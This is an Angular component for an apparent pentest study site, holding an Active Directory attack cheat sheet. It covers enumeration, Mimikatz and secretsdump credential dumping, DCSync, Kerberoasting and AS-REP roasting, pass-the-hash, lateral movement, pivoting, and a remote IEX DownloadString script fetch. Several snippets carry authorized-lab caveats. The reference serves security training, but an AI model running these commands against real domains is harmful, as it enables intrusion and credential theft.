
import { Component, DestroyRef, OnInit, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { MatExpansionModule } from '@angular/material/expansion';
import { ActivatedRoute, Router } from '@angular/router';
import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
import { Terminal } from '../../shared/terminal/terminal';
import { SectionIndexComponent, SectionIndexItem } from '../../shared/components/section-index/section-index';

@Component({
  selector: 'app-active-directory',
  standalone: true,
  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent],
  templateUrl: './active-directory.html',
  styleUrl: './active-directory.scss',
})
export class ActiveDirectory implements OnInit {

  selectedService: string | null = 'full-ad-compromise-linux';
  readonly sections: SectionIndexItem[] = [
    { id: 'full-ad-compromise-linux', label: 'Kali Single-Host Flow', group: 'AD Flow' },
    { id: 'ad-flow', label: 'Windows Pivot Flow', group: 'AD Flow' },
    { id: 'windows', label: 'Windows Commands', group: 'Enumeration' },
    { id: 'powerview', label: 'PowerView', group: 'Enumeration' },
    { id: 'manual', label: 'Manual Enumeration', group: 'Enumeration' },
    { id: 'spn', label: 'SPN Enumeration', group: 'Enumeration' },
    { id: 'acl', label: 'Object Permissions', group: 'Enumeration' },
    { id: 'shares', label: 'Domain Shares', group: 'Enumeration' },
    { id: 'bloodhound', label: 'BloodHound', group: 'Enumeration' },
    { id: 'credentials', label: 'Credential Access', group: 'Attacking' },
    { id: 'kerberos', label: 'Kerberos Attacks', group: 'Attacking' },
    { id: 'passwords', label: 'Password Attacks', group: 'Attacking' },
    { id: 'compromise', label: 'Domain Compromise', group: 'Attacking' },
    { id: 'planned-privesc', label: 'Privilege Escalation', group: 'Coming later', disabled: true },
    { id: 'planned-post-exploitation', label: 'Post-Exploitation', group: 'Coming later', disabled: true }
  ];
  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);
  private readonly destroyRef = inject(DestroyRef);

  ngOnInit(): void {
    this.route.queryParamMap
      .pipe(takeUntilDestroyed(this.destroyRef))
      .subscribe(params => {
        const service = params.get('service');
        if (service && this.sections.some(item => item.id === service && !item.disabled)) {
          this.selectedService = service;
        }
      });
  }

  // =========================================================
  // NAVIGATION
  // =========================================================

  selectService(service: string): void {
    this.selectedService = service;
    void this.router.navigate([], {
      relativeTo: this.route,
      queryParams: { service },
      replaceUrl: true
    });
  }

  clearService(): void {
    this.selectedService = 'full-ad-compromise-linux';
  }

  // =========================================================
  // WINDOWS COMMANDS
  // =========================================================

  windowsUsers = `
# List users in the domain
net user /domain

# Get information about a specific domain user
net user <username> /domain
`;

  windowsGroups = `
# List domain groups
net group /domain

# Enumerate a specific domain group
net group "Sales Department" /domain
`;

  // =========================================================
  // POWERVIEW
  // =========================================================

  powerViewImport = `
# Import PowerView
Import-Module .\\PowerView.ps1

# Get basic domain information
Get-NetDomain
`;

  powerViewUsers = `
# List domain users
Get-NetUser

# Display common names
Get-NetUser | Select-Object cn

# Display password and logon information
Get-NetUser | Select-Object cn,pwdlastset,lastlogon
`;

  powerViewGroups = `
# List domain groups
Get-NetGroup

# Display group names
Get-NetGroup | Select-Object cn

# Enumerate members of a specific group
Get-NetGroup "Sales Department" | Select-Object member
`;

  // =========================================================
  // MANUAL ENUMERATION
  // =========================================================

  manualComputers = `
# Enumerate domain computers
Get-NetComputer

# Identify operating systems and hostnames
Get-NetComputer | Select-Object operatingsystem,dnshostname

# Include operating system versions
Get-NetComputer | Select-Object operatingsystem,dnshostname,operatingsystemversion
`;

  manualLocalAdmin = `
# Find systems where the current user has local admin access
Find-LocalAdminAccess
`;

  manualSessions = `
# Query sessions on a named domain computer such as files04
Get-NetSession -ComputerName <name> -Verbose

# Example: query files04
Get-NetSession -ComputerName files04 -Verbose

# List logged-on users with PsLoggedOn
.\\PsLoggedon.exe \\\\<name>

# Example: query files04
.\\PsLoggedon.exe \\\\files04
`;

  // =========================================================
  // SPN ENUMERATION
  // =========================================================

  spnSetspn = `
# List SPNs registered to a user
setspn -L <user>

# Example: inspect the iis_service account
setspn -L iis_service
`;

  spnPowerView = `
# Find domain users with registered SPNs
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
`;

  spnDns = `
# Perform a reverse DNS lookup
nslookup.exe <IP>
`;

  // =========================================================
  // OBJECT PERMISSIONS / ACLs
  // =========================================================

  aclRights = `
# GenericAll: Full control over the object
# GenericWrite: Modify object attributes
# WriteOwner: Change the object's owner
# WriteDACL: Modify the object's access control list
# AllExtendedRights: Inspect the specific extended rights
# ForceChangePassword: Reset a user's password
# Self: Perform permitted self-membership or attribute changes
`;

  aclEnumeration = `
# Enumerate permissions on a user object
Get-ObjectAcl -Identity <user>

  # Example: inspect the stephanie user object
Get-ObjectAcl -Identity stephanie

# Convert a SID to a name
Convert-SidToName <ObjectSID>
`;

  aclGenericAll = `
# Find GenericAll permissions on a group
Get-ObjectAcl -Identity "Management Department" |
  Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} |
  Select-Object SecurityIdentifier,ActiveDirectoryRights
`;

  aclGroupMembership = `
# Add a user to a domain group
net group "Management Department" stephanie /add /domain

# Verify group membership
Get-NetGroup "Management Department" | Select-Object member

# Remove the user from the group
net group "Management Department" stephanie /delete /domain
`;

  // =========================================================
  // DOMAIN SHARES
  // =========================================================

  sharesEnumeration = `
# Discover domain shares
Find-DomainShare

# Check which shares are accessible
Find-DomainShare -CheckShareAccess
`;

  sharesAccess = `
# List the contents of a SYSVOL path
Get-ChildItem \\\\dc1.corp.com\\sysvol\\corp.com\\
`;

  sharesGpp = `
# Decrypt a Group Policy Preferences password hash
gpp-decrypt <password>
`;

  // =========================================================
  // BLOODHOUND / SHARPHOUND
  // =========================================================

  bloodhoundOverview = `
# SharpHound collects Active Directory relationship data.
# BloodHound visualizes relationships and potential attack paths.

# Useful analysis goals:
# - Shortest path to Domain Admin
# - Misconfigured object permissions (ACLs)
# - Local administrator relationships
# - Session-based attack paths
# - Kerberoastable and AS-REP roastable users
`;

  sharpHoundDownload = `
# Download and load the PowerShell collector
IEX (New-Object Net.WebClient).DownloadString(
  'http://<IP>/SharpHound.ps1'
)

# Alternative: download the executable using certutil
certutil -urlcache -f http://<IP>/SharpHound.exe SharpHound.exe

# Alternative: download a file using PowerShell
Invoke-WebRequest -Uri http://<IP>/SharpHound.exe \`
  -OutFile SharpHound.exe
`;

  sharpHoundCollection = `
# Collect supported data using SharpHound
.\\SharpHound.exe -c All

# Save the output to a specific directory
.\\SharpHound.exe -c All --outputdirectory C:\\Temp

# Specify the target domain
.\\SharpHound.exe -c All -d resourced.local
`;

  sharpHoundPowerShell = `
# Import the PowerShell collector
Import-Module .\\SharpHound.ps1

# Review available parameters
Get-Help Invoke-BloodHound

# Collect data and specify the output directory
Invoke-BloodHound -CollectionMethod All \`
  -OutputDirectory C:\\Users\\user\\Desktop \`
  -OutputPrefix "domain audit"
`;

  bloodhoundKali = `
# Start the Neo4j database service
sudo neo4j start

# Launch BloodHound
bloodhound
`;

  bloodhoundTransfer = `
# From an Evil-WinRM session, download the collected ZIP
download 20240504120000_BloodHound.zip
`;

  bloodhoundQueries = `
# Useful BloodHound analysis goals

# Shortest Path to Domain Admin
# Find Local Admin Rights
# Find Kerberoastable Users
# Find AS-REP Roastable Users
# Find Sessions (Logged-on Users)
`;


  // =========================================================
  // ATTACKING ACTIVE DIRECTORY
  // =========================================================

  // CREDENTIAL ACCESS

  attackCredentialOverview = `
# Identify the current security context
whoami
whoami /all

# Inspect interactive sessions
query user
qwinsta

# Inspect Kerberos tickets
klist

# Credential-access assessment checklist
# - Current user privileges
# - Local administrator or SYSTEM access
# - Logged-on privileged accounts
# - Accessible credential stores
# - Windows security protections
`;

  attackLsass = `
# Mimikatz: credential material in LSASS
# Use only in an authorized lab with appropriate privileges.

.\\mimikatz.exe

# Within the Mimikatz console
privilege::debug
sekurlsa::logonpasswords
sekurlsa::msv
sekurlsa::tickets
sekurlsa::ekeys

# Results depend on Windows protections, logon state
# and the privileges of the current process.
`;

  attackCachedCredentials = `
# In an elevated Mimikatz console, inspect cached domain logons
lsadump::cache

# DCC2 / MS Cache v2 is not an NTLM hash.
# Offline password auditing with Hashcat:
hashcat -m 2100 hashes.txt /path/to/wordlist.txt

# John the Ripper:
john --format=mscash2 hashes.txt
`;

  attackSam = `
# Save local registry hives (requires appropriate privileges)
reg save HKLM\\SAM C:\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM

# Analyze the exported hives on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# SAM contains local account hashes, not all domain hashes.
`;

  attackLsaSecrets = `
# In a Mimikatz console, inspect LSA secrets
lsadump::secrets

# Inspect local SAM hashes in the same console
lsadump::sam

# LSA secrets may contain service-related or machine-account
# material depending on the system configuration.
`;

  attackCredentialManager = `
# Enumerate credentials visible to the current user
cmdkey /list

# Inspect current Kerberos tickets
klist

# Mimikatz commands for an authorized lab
sekurlsa::credman
vault::cred

# Results depend on Windows version, logon session
# and the current security context.
`;

  attackDpapi = `
# In a Mimikatz console, inspect DPAPI material in memory
sekurlsa::dpapi

# DPAPI can protect browser data, application secrets
# and Credential Manager data.
#
# Recovering a master key does not automatically decrypt
# every protected file. Additional key material may be needed.
`;

  attackNtds = `
# Assess domain-controller credential exposure.
# Requires valid authentication and appropriate privileges.

# Remote assessment of a single account
impacket-secretsdump -just-dc-user <username> <domain>/<user>@<dc-ip>

# Use a lab account and the actual domain-controller address.
# Ordinary domain-user credentials are not sufficient by themselves.
`;

  // =========================================================
  // KERBEROS ATTACKS
  // =========================================================

  attackAsrep = `
# Kali: request AS-REP material for accounts without
# Kerberos preauthentication (authorized lab)
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -no-pass -format hashcat -outputfile asrep.txt

# Offline audit with Hashcat
hashcat -m 18200 asrep.txt /path/to/wordlist.txt

# Windows: Rubeus
.\\Rubeus.exe asreproast /nowrap

# Only accounts configured without preauthentication
# are susceptible to this technique.
`;

  attackKerberoast = `
# Kali: request service-ticket hashes for SPN accounts
impacket-GetUserSPNs <domain>/<user> -dc-ip <dc-ip> -request -outputfile kerberoast.txt

# Offline audit (Hashcat mode depends on hash type)
hashcat -m 13100 kerberoast.txt /path/to/wordlist.txt

# Windows: Rubeus
.\\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Review account privilege, SPN ownership and password strength.
`;

  attackTicketEnumeration = `
# List tickets in the current Windows logon session
klist

# Mimikatz: inspect tickets in LSASS
sekurlsa::tickets

# Rubeus: enumerate ticket metadata
.\\Rubeus.exe triage

# Exporting or accessing tickets requires appropriate access.
# Protect exported .kirbi files as sensitive credentials.
`;

  attackPassTheTicket = `
# Rubeus ticket operations require an authorized lab
# and a valid ticket belonging to the test environment.

# Inspect tickets
klist

# Rubeus ticket import syntax
.\\Rubeus.exe ptt /ticket:<ticket-file.kirbi>

# Verify the current session's ticket cache
klist

# A ticket does not automatically grant access to every host:
# the service, identity, validity and permissions must match.
`;

  attackSilverTicket = `
# Silver Ticket concepts

# A service ticket is forged using the target service account's
# key material, plus domain and service-specific information.

# Assessment prerequisites:
# - Authorized access to the relevant service-account key
# - Correct domain SID and service SPN
# - Understanding of service-side validation and privileges

# Validate exposure and remediate weak service-account passwords.
# Avoid creating forged tickets outside a controlled lab.
`;

  // =========================================================
  // PASSWORD ATTACKS
  // =========================================================

  attackPasswordPolicy = `
# Inspect domain password and lockout policy
net accounts /domain

# Inspect local account policy
net accounts

# Review:
# - Lockout threshold
# - Lockout duration
# - Observation window
# - Password length and complexity
#
# Confirm the approved testing limits before authentication tests.
`;

  attackCredentialValidation = `
# Resolve the current domain, PDC and base DN for an LDAP test.
# This snippet does not bind or validate credentials.

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = $domainObj.PdcRoleOwner.Name
$dn = "DC=" + $domainObj.Name.Replace(".", ",DC=")
$path = "LDAP://$pdc/$dn"

# Perform any credential bind separately with authorized lab credentials.
# Do not hardcode passwords in scripts or command history.
`;

  attackPasswordSpray = `
# Password spraying tests one approved candidate password
# against a controlled set of test accounts.
#
# Before testing:
# 1. Obtain explicit authorization.
# 2. Review lockout policy and approved attempt limits.
# 3. Use designated lab accounts.
# 4. Monitor authentication logs.
#
# Do not run a spray against an unspecified or production domain.
`;

  attackSmbValidation = `
# Validate a known lab credential against an authorized SMB host
# with NetExec (success does not necessarily mean admin access).

nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>'

# Enumerate shares when authorized
nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>' --shares

# Review authentication status, privileges and share permissions.
`;

  attackKerbrute = `
# Kerbrute password spraying syntax for a controlled lab
# Confirm lockout policy and test scope first.

kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt '<lab-password>'

# Stop if authentication errors or lockout indicators appear.
# Prefer dedicated test accounts and an agreed attempt limit.
`;

  // =========================================================
  // DOMAIN COMPROMISE
  // =========================================================

  attackDcsyncRequirements = `
# DCSync abuses directory replication permissions.
# It does not require an interactive login to the DC, but
# the account must have the relevant replication rights.

# Review effective permissions for:
# - Replicating Directory Changes
# - Replicating Directory Changes All
# - Replicating Directory Changes In Filtered Set (where relevant)

# Investigate unexpected principals with replication privileges.
`;

  attackDcsyncDetection = `
# Detection and validation checklist

# - Review directory replication events and domain-controller logs.
# - Investigate replication requests from unusual hosts/accounts.
# - Audit privileged group membership and delegated ACLs.
# - Remove unnecessary replication rights.
# - Rotate exposed credentials and assess krbtgt remediation
#   with the domain administrator.
#
# Event availability depends on audit policy and Windows version.
`;

  attackPostCompromise = `
# Post-assessment checklist

1. Record the account and credential type discovered.
2. Identify the exact privileges and affected systems.
3. Avoid using recovered credentials beyond the approved scope.
4. Protect evidence and redact secrets in reports.
5. Notify the system owner of critical credential exposure.
6. Recommend credential rotation and least-privilege remediation.
7. Remove temporary files and tools according to the engagement plan.
`;


  // =========================================================
  // AD SET FLOW - SCAN
  // =========================================================

  flowScan = `
# Full TCP port scan
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN openPorts

# Review discovered ports
cat openPorts
`;

  flowServices = `
# Enumerate discovered services and default scripts
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN services

# Common Active Directory ports
# 53    DNS
# 88    Kerberos
# 135   MSRPC
# 139   NetBIOS
# 389   LDAP
# 445   SMB
# 464   Kerberos password change
# 636   LDAPS
# 3268  Global Catalog
# 3389  RDP
# 5985  WinRM
# 1433  MSSQL
`;

  // =========================================================
  // AD SET FLOW - ACCESS
  // =========================================================

  flowWinRM = `
# Connect to an authorized lab host using valid credentials
evil-winrm -i TARGET_IP -u USER -p 'PASSWORD'
`;

  flowHostEnumeration = `
# Identify the current user and security context
whoami
whoami /all
whoami /priv
whoami /groups

# Identify the host
hostname
systeminfo

# Review network configuration
ipconfig /all
route print

# Review local users and groups
net user
net localgroup
net localgroup Administrators
`;

  // =========================================================
  // AD SET FLOW - PRIVILEGE ESCALATION
  // =========================================================

  flowPrivEscChecks = `
# Check current security privileges
whoami /priv
whoami /groups

# Review operating system details
systeminfo

# Inspect services
Get-Service

# Review scheduled tasks
schtasks /query /fo LIST /v
`;

  flowPrivEscReview = `
# Privilege escalation review checklist
# 1. Identify enabled token privileges.
# 2. Review service permissions and service paths.
# 3. Inspect scheduled tasks and their permissions.
# 4. Check writable directories and executable paths.
# 5. Review installed software and applicable patches.
# 6. Search for exposed configuration files and credentials.
# 7. Validate each finding only in the authorized lab.
# 8. Record evidence and the resulting security context.
`;

  // =========================================================
  // AD SET FLOW - POST-COMPROMISE
  // =========================================================

  flowPostCompromise = `
# Confirm the current identity and privilege level
whoami
whoami /all

# Review local administrators
net localgroup Administrators

# Review domain groups
net group /domain

# Review domain users
net user /domain

# Review current logon sessions
query user
qwinsta

# Inspect locally available Kerberos tickets
klist
`;

  flowCredentialAudit = `
# Credential exposure assessment
# Review the following sources within the authorized scope:
#
# - Application configuration files
# - Scripts containing embedded credentials
# - PowerShell history
# - Windows services and scheduled task configurations
# - Unattended installation files
# - Accessible shares and backup files
#
# Treat passwords, hashes, tickets and secret material as sensitive.
# Do not export or retain credentials outside the approved lab scope.
`;

  flowKerberosAudit = `
# Enumerate SPNs registered to a domain user
setspn -L USER

# Find domain users with registered SPNs using PowerView
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# Review the current Kerberos ticket cache
klist

# Review delegation and privileged-account exposure.
# Use approved directory auditing tools to inspect:
# - Unconstrained delegation
# - Constrained delegation
# - Resource-based constrained delegation
# - Privileged group membership
# - Replication-related directory permissions
`;

  flowMssqlAudit = `
# MSSQL security assessment checklist
#
# 1. Identify reachable SQL Server instances.
# 2. Verify which account is used for authentication.
# 3. Review server roles and database permissions.
# 4. Check whether the account has excessive privileges.
# 5. Review linked servers and delegation configuration.
# 6. Check whether dangerous features are enabled unnecessarily.
# 7. Document evidence and recommended remediation.
#
# Perform testing only against explicitly authorized instances.
`;

  // =========================================================
  // AD SET FLOW - PIVOTING
  // =========================================================

  flowPivotEnumeration = `
# On the Windows pivot host
ipconfig /all
route print

# Identify the network interfaces and reachable subnets.
# Record the pivot host IP and the target subnet before
# configuring the tunnel.
`;

  flowLigolo = `
# Start the Ligolo-ng proxy on the authorized testing machine
sudo ./proxy -selfcert

# Start the Ligolo-ng agent on the authorized pivot host
# Use the proxy address and port configured for your lab.
# Example agent invocation:
./agent -connect PROXY_IP:11601 -ignore-cert

# After the agent connects:
# 1. Select the correct session in the proxy.
# 2. Start the tunnel.
# 3. Configure the route to the lab subnet.
# 4. Verify reachability before scanning.
#
# Consult the Ligolo-ng documentation for your platform
# and the exact route configuration required by your lab.
`;

  // =========================================================
  // AD SET FLOW - POST-PIVOTING
  // =========================================================

  flowPostPivot = `
# Scan a newly reachable lab host
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN pivotPorts

# Enumerate discovered services
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN pivotServices

# Reassess each host
# - Identify the operating system and exposed services.
# - Enumerate domain membership and available shares.
# - Validate access using approved lab credentials.
# - Review SQL Server and other application services.
# - Update the network map and document findings.
#
# Do not assume that credentials valid on one host
# should be reused on another without authorization.
`;


  // Full AD Compromise from Linux

  linuxAdInitialScan = String.raw`# Full TCP port scan; save open ports for the follow-up command
  nmap -p- --min-rate 5000 -T4 <IP> -oN openPorts

# Service and version detection
nmap -sCV -p <ports> <IP>

# Parse openPorts and scan discovered services
nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) <IP> -oN services

# Important AD ports
# 88   Kerberos
# 389  LDAP
# 445  SMB
# 5985 WinRM
# 3268 Global Catalog`;

  linuxAdNoCredentials = String.raw`# RPC enumeration
rpcclient -U "" -N <IP>
# Inside rpcclient:
enumdomusers
querydispinfo

# SMB anonymous enumeration
smbclient -L //<IP> -N
smbclient //<IP>/<Share> -N
crackmapexec smb <IP> --shares -u '' -p ''
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt
enum4linux -a <IP>
enum4linux -u 'domain.com\\guest' -a <IP>
smbmap -u anonymous -H <IP>

# LDAP anonymous: discover Base DN
ldapsearch -x -H ldap://<IP> -s base

# Anonymous LDAP enumeration
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com"

# Extract domain usernames
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" -s sub "(&(objectClass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Search user descriptions and other attributes for exposed credentials
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" "(objectClass=user)" description

# Authenticated LDAP query
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com"

# Enumerate computer objects and check readable LAPS attributes
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName ms-Mcs-AdmPwd

# Kerberos username enumeration
kerbrute userenum -d corp.com users.txt --dc <IP>

# AS-REP roasting
impacket-GetNPUsers corp.com/ -no-pass -usersfile users.txt -dc-ip <IP>

# Crack AS-REP hashes
hashcat -m 18200 hashes.txt rockyou.txt

# DNS zone transfer
dig axfr corp.com @<IP>`;

  linuxAdWithCredentials = String.raw`# Validate credentials
crackmapexec smb <IP> -u user -p '<PASSWORD>' -d corp.com

# Password policy
crackmapexec smb <IP> -u user -p '<PASSWORD>' --pass-pol

# Check whether any listed account accepts an empty password
nxc smb <IP> -u users.txt -p '' --continue-on-success

# Change an expired or must-change password when authorized
impacket-changepasswd domain/user@<DC_IP> -newpass '<NEW_PASSWORD>'

# Enumerate SMB shares
crackmapexec smb <IP> -u user -p '<PASSWORD>' --shares

# Enumerate domain SIDs and users
impacket-lookupsid domain/user:'<PASSWORD>'@<IP>
impacket-lookupsid domain.local/ -no-pass
impacket-lookupsid domain.local/guest@<IP> -no-pass
impacket-lookupsid anonymous@<IP>

# Access SYSVOL
smbclient //dc1/SYSVOL -U 'domain.htb/user%<PASSWORD>'
smbclient //dc1/SYSVOL -U user -c "recurse ON; prompt OFF; ls"

# Access shares
smbclient //<IP>/<Share> -U 'user%<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>' -r <Share>

# Enumerate domain users
impacket-GetADUsers corp.com/user:'<PASSWORD>' -dc-ip <IP>

# Enumerate computer objects
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName operatingSystem

# Kerberoasting
impacket-GetUserSPNs corp.com/user:'<PASSWORD>' -dc-ip <IP> -request

# Crack Kerberoast hashes
hashcat -m 13100 hashes.txt rockyou.txt

# BloodHound collection
bloodhound-python -u user -p '<PASSWORD>' -d corp.com -dc dc1.corp.com -c all

# Check local administrator access across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com --local-auth

# Enumerate active SMB sessions
crackmapexec smb <IP> -u user -p '<PASSWORD>' --sessions`;

  linuxAdLateralMovement = String.raw`# WinRM - password
evil-winrm -i <IP> -u user -p '<PASSWORD>'

# WinRM - domain formats
evil-winrm -i <IP> -u 'corp\\user' -p '<PASSWORD>'
evil-winrm -i <IP> -u user@corp.com -p '<PASSWORD>'

# WinRM - Pass the Hash
evil-winrm -i <IP> -u user -H <NTLM_HASH>

# WMI execution
impacket-wmiexec corp.com/user:'<PASSWORD>'@<IP>
impacket-wmiexec user:'<PASSWORD>'@<IP>

# PsExec - requires administrative access
impacket-psexec corp.com/user:'<PASSWORD>'@<IP>
impacket-psexec user:'<PASSWORD>'@<IP>

# Pass the Hash with WMI
impacket-wmiexec -hashes :<NTLM_HASH> user@<IP>

# Pass the Hash with PsExec
impacket-psexec -hashes :<NTLM_HASH> Administrator@<IP>

# Validate an NTLM hash
crackmapexec smb <IP> -u user -H <NTLM_HASH>

# Validate credentials across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com

# Decision guide
# 5985/5986 open + authorized user -> WinRM
# SMB + local admin privileges -> PsExec
# WinRM unavailable, SMB available -> consider WMI
# NTLM hash available -> test authorized Pass-the-Hash options`;

  linuxAdCredentialDumping = String.raw`# Remote credential dumping - requires sufficient privileges
impacket-secretsdump corp.com/user:'<PASSWORD>'@<IP>

# Extract local SAM hashes from collected hives
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Extract NTDS hashes from collected files
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Extract LSA secrets from collected hives
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL

# NetExec: SAM
nxc smb <IP> -u user -p '<PASSWORD>' --sam

# NetExec: LSA secrets
nxc smb <IP> -u user -p '<PASSWORD>' --lsa

# NetExec: LSASS
nxc smb <IP> -u user -p '<PASSWORD>' -M lsassy

# NetExec: NTDS - requires replication privileges
nxc smb <DC_IP> -u user -p '<PASSWORD>' --ntds

# NetExec: LAPS - requires permission to read the relevant attributes
nxc smb <IP> -u user -p '<PASSWORD>' -M laps

# NetExec: gMSA - requires appropriate directory permissions
nxc ldap <DC_IP> -u user -p '<PASSWORD>' --gmsa

# NetExec: enumerate sessions and logged-on users
nxc smb <IP> -u user -p '<PASSWORD>' --sessions
nxc smb <IP> -u user -p '<PASSWORD>' --loggedon-users

# Search accessible shares for interesting files
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus

# Download files discovered by spider_plus
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True

# Crack cached domain credentials where applicable
john --wordlist=rockyou.txt --format=mscash2 hash.txt

# DCSync - requires domain replication rights
impacket-secretsdump -just-dc-user administrator corp.com/user:'<PASSWORD>'@<DC_IP>
impacket-secretsdump -just-dc corp.com/user:'<PASSWORD>'@<DC_IP>

# Offline analysis of an LSASS dump
pypykatz lsa minidump lsass.dmp

# Search common locations for stored credentials on an authorized Windows host
# PowerShell history:
# %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
#
# Common files:
# *.config, *.xml, *.ini, *.txt, web.config, Unattend.xml, sysprep.xml
#
# Group Policy Preferences:
# Search SYSVOL XML files for the cpassword attribute
#
# Credential Manager:
# cmdkey /list
# vaultcmd /list`;


}
